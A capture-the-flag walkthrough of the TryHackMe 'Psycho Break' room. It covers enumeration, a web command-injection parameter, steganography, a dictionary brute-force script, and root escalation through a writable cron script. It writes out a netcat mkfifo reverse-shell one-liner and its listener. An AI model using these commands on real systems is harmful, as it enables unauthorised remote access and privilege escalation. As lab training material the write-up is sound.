# Psycho Break

[<img src=".Images/psycho.jpeg" height="150">](https://tryhackme.com/room/psychobreak)

*"Help Sebastian and his team of investigators to withstand the dangers that come ahead."* -[shafdo](https://tryhackme.com/p/shafdo)

1. [Scan/Enumeration](#scan/enumeration)
2. [Gain Shell](#gain-shell)
3. [Privilege Escalation](#privilege-escalation)

******

## [Scan/Enumeration]

We can start by doing an nmap scan.

`nmap -A -oN tartarus.nmap <ip>`

![psycho-1](.Images/psycho-1.png)

We can see that FTP, SSH and Apache http services are running. FTP doesn't allow anonymous login. So let's start by looking at the web server.

On the page that welcomes us, when we look at the source code, we will see the "/sadistRoom" directory. The sadist room will give us the key to locker room.

In locker room, we find a encoded text. I use a [cipher identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) to find out what the text has been encrypted with and i decode it with [CyberChef](https://gchq.github.io/CyberChef/).

![psycho-2](.Images/psycho-2.png)
![psycho-3](.Images/psycho-3.png)

Now we can access the map.

![psycho-4](.Images/psycho-4.png)

We see 4 different locations on the map. We have already finished with the first two. If you look at The Abandoned Room, you'll see that we need the keeper key to access it. We will reach this key via safe heaven.

At this point I tried a lot of things. I downloaded all the images on the site and tried to find something in them but I couldn't find anything.

If it's not in the images, I thought this should be a directory. To find the directory, I did a gobuster scan using the ["directory-list-2.3-medium.txt"](https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt).

`gobuster dir -u http://<IP>/SafeHeaven/ -w directory-list-2.3-medium.txt`

![psycho-5](.Images/psycho-5.png)

In this directory, we need to find the location of the image. We can use reverse image search. You can easily find the answer and get the keeper key.

We will meet Laura the Spiderlady in the Abandoned room. We will see a hint as we look at the source code. 

*"There is something called "shell" on current page maybe that'll help you to get out of here !!!"* 

We can try the word "shell" to give a parameter to the PHP file.

`http://<IP>/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls`

Yes, it is work. But we can only run the ls command. After trying a few alternatives, I use the "ls .." command to list a parent directory and it works. In the upper directory we see two directory or files encrypted with md5. One is the directory we are in, and the other we need to look to understand what it is.

![psycho-6](.Images/psycho-6.png)

We found "helpme.zip".

## [Gain Shell]

When we unzip the file, we will see a txt file and a jpg. The txt file says the key is in the Table.jpg. When we look at this jpg file with the "file" command, we see that it is actually a zip.

![psycho-7](.Images/psycho-7.png)

When you listen to the audio file, you will see that it has morse code. To decode this, I find an [audio morse decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) with a simple search.

![psycho-8](.Images/psycho-8.png)

I will use this word to extract files from "Joseph_0da.jpg" with the steghide tool.

`steghide extract -sf Joseph_0da.jpg`

![psycho-9](.Images/psycho-9.png)

Now we have the FTP information, we can try to login. In FTP server, we have two file. One ELF(executable) file and one dictionary file.

![psycho-10](.Images/psycho-10.png)

As it is understood, we will need to bruteforce the program file with the dictionary file we found. I will use the python language for this.

```
import os

f = open('random.dic','r')

for i in f:
    i = i.replace("\n","")
    result = os.popen(f"./program {i}").read()
    if "Incorrect" not in result:
        print(result)
        break

f.close()
```

![psycho-11](.Images/psycho-11.png)

Now we need decode this text. The cipher identifier I used before could not identify it. I have encountered this encryption before, I know it is related to the phone. After a few tries on a [decode site](https://www.dcode.fr/en), I find what I'm looking for. This is "Multi-tap Phone Cipher".

![psycho-12](.Images/psycho-12.png)

Now, we have some credentials. We can try these for SSH connection.

## [Privilege Escalation]

When I login a linux machine, I first check the SUID files and cronjobs. Here too I found something in /etc/crontab file.

![psycho-13](.Images/psycho-13.png)

We see that we have the authority to write to this file, which is run regularly with root authority. Let's get a reverse shell. I will use netcat.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f`

![psycho-14](.Images/psycho-14.png)

`nc -nvlp <PORT>`

After waiting for a while, we will have root privilege.

![psycho-15](.Images/psycho-15.png)
